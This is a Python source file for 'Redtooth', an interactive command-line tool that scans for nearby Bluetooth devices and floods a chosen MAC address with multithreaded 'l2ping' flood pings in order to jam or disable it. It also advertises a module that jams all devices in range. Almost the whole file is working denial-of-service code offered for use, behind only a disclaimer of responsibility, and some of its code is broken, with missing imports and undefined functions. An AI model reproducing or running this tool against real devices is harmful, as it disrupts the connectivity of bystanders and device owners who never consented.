import os
from bluetooth import *
import art
import subprocess
from alive_progress import alive_bar
import time
import threading



threads_ar = []
global blocked_addr 
blocked_addr = []
global found_addr
found_addr = []
global packetsize
global threads_count
global target
print("\n")
art.tprint("Redtooth", font="fraktur")
print("=====================================")
print("Author: Logan Goins\n")
if not os.geteuid() == 0:
    sys.exit("\nRun as root\n")
print("Type \"help\" for more information")
print("I am not responsible for any damages or misuse from this software.\nThis software is used at your own risk.\n")
print("Checking if your bluetooth adapter is enabled...")
try:
    nearby_devices = discover_devices()
except OSError:
    print("Please enable your bluetooth adapter")
    exit()


def DOS(target, packetsize):
    subprocess.call(["l2ping", "-i", "hci0", "-s", str(packetsize), "-f", target], stdout=open(os.devnull, 'wb'))
    

def jam_module():
    while True:
        prompt = "\nRedtooth/jam/> "
        print(prompt, end="")

        command = input().lower().split(" ")
        print(" ")
        if len(command) >= 3:
            cmd = command[0]
            subcmd = command[1]
            arg = command[2]
            params = [cmd, subcmd, arg]
        elif len(command) >= 2:
            cmd = command[0]
            subcmd = command[1]
            params = [cmd, subcmd]

        elif len(command) >= 1:
            cmd = command[0]
            params = [cmd]

        if cmd == "show" and subcmd == "options":
            print("Options: \n==========================")
            print("set target <target>          ---  sets target MAC address for disabling")
            print("set packetsize <packet size> ---  sets packet size for use (in bytes)")
            print("set threads <thread number>  ---  sets number of threads for attack")
            print("run                          ---  starts attack")
            print("stop                         ---  stops all data flow")
            print("exit                         ---  returns to the parent module")

        if cmd == "set" and subcmd == "target":

            target = arg
            print(target + " ---> target")


        if cmd == "set" and subcmd == "threads":
            
            threads_count = arg
            print(threads_count + " ---> threads")

        if cmd == "set" and subcmd == "packetsize":
            
            packetsize = arg
            print(packetsize + " ---> packet size")


        if cmd == "run":
            jam(target, threads_count, packetsize)

        if cmd == "exit":
            main()

        if cmd == "stop":
            os.system("killall l2ping")



def scan():

    
    try:    
        print("Scanning for devices...")

        nearby_devices = discover_devices(lookup_names = True)
        

        print(" ")
        print("        Devices:\n")
        print("============================================")
        for name, addr in nearby_devices:
            print (" > %s - %s" % (addr, name))
            

        print(" \n")
        print("============================================")
        print ("found %d devices" % len(nearby_devices))
        print(" ")
    except OSError as error:
        print(error)
        print("Make sure your bluetooth adapter is up and connected")
        main()
        

def jam(target, threads_count, packetsize):
   
    print("[*] Starting DOS attack in 3 seconds...")

    for i in range(0, 3):
        print('[*] ' + str(3 - i))
        time.sleep(1)
    os.system('clear')

    print("Building Threads")
    with alive_bar(int(threads_count)) as bar:
        for i in range(0, int(threads_count)):
         
            t = threading.Thread(target=DOS, args=[str(target), str(packetsize)])
            t.start()
            threads_ar.append(t)
            bar()
    

    print('[*] Built all threads...')
    print('[*] Starting...')

    blocked_addr.append(target)

    jam_module()
    
    
def help_menu():
    print(" \n")
    print("Commands")
    print("--------------------------")
    print("show modules                 ---  shows modules used by Redtooth")
    print("use <module_name>            ---  selects and enters into the selected module")
    print("show options                 ---  shows options for selected module")
    print("show blocked                 ---  shows all MAC addresses and hostnames jammed")
    print("scan                         ---  scans area for bluetooth devices")
    print("clear                        ---  clears terminal window")
    print("exit                         ---  exits Redtooth")
    print(" ")




def main():
    while True:
        prompt = "\nRedtooth/> "
        print(prompt, end="")

        command = input().lower().split(" ")
        print(" ")
        if len(command) >= 3:
            cmd = command[0]
            subcmd = command[1]
            arg = command[2]
            params = [cmd, subcmd, arg]
        elif len(command) >= 2:
            cmd = command[0]
            subcmd = command[1]
            params = [cmd, subcmd]

        elif len(command) >= 1:
            cmd = command[0]
            params = [cmd]


        if cmd == "scan":
            scan()


        if cmd == "use" and subcmd == "jam":
            jam_module()

        if cmd == "show" and subcmd == "modules":
            print("\nModules:\n===============================")
            print("jam       ---   bluetooth connection jammer/disabler")
            print("blockall  ---   jams/disables all devices possible")

        if cmd == "use" and subcmd == "blockall":
            blockall_module()

        if cmd == "help" or cmd == "show" and subcmd == "options":
            help_menu()
        
        if cmd == "clear":
            os.system("clear")

        if cmd == "exit" or cmd == "quit":
            exit()
        
        if cmd == "show" and subcmd == "blocked":
            print("Blocked devices\n====================")
            for e in blocked_addr:
                print(str(e))

        else:
            "Invalid command\n"


if __name__ == "__main__":
    
    main()
